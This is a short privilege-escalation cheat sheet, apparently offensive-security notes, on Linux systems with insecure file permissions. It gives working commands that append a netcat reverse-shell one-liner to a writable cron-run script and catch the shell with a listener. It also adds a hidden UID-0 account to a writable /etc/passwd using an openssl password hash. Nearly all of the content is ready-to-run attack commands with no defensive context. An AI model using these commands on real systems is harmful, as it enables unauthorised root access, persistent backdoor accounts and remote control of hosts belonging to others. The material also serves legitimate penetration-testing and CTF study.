# Insecure File Permissions

## Cron jobs

__REQUIRES__

 - Cronjob running a script
 - Write permission over said script
 - Said script running on reasonable interval

Check cron history and verify file permissions
```bash
grep "CRON" /var/log/syslog

ls -lah $file
```

Append rshell
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip 1234 >/tmp/f" >> $file
```

catch rshell
```bash
nc -lvnp 1234
```

## Abuse Password Authentication

__REQUIRES__

 - Write permissions on /etc/passwd

Create password hash
```bash
openssl passwd my_pass
```

Add account to /etc/passwd
```bash
echo "rooty:$hash:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Sign in as new user
```bash
su rooty
```